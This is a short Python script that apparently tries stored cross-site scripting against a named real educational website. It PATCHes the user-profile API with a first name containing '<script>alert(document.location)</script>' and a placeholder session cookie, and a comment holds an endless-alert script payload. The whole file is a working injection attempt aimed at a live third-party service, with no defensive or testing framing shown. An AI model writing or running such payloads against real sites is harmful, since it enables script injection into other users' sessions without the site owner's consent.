import requests

#<script>let i=1; while(i == 1){alert(1)};</script>

firstname = 'john<script>alert(document.location)</script>'
surname = 'doe'
url = "https://www.drfrost.org/api/user/other"

headers = {
    "Cookie":"hideCookieConsent=true; PHPSESSID=!!!!!PSHSESSIDHERE!!!!!;",
    "User-Agent":"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Referer":"https://www.drfrost.org/settings.php?tab=account"
}

payload = {
    "firstname":f"{firstname}",
    "surname":f"{surname}",
}


req = requests.patch(url=url,headers=headers,json=payload)
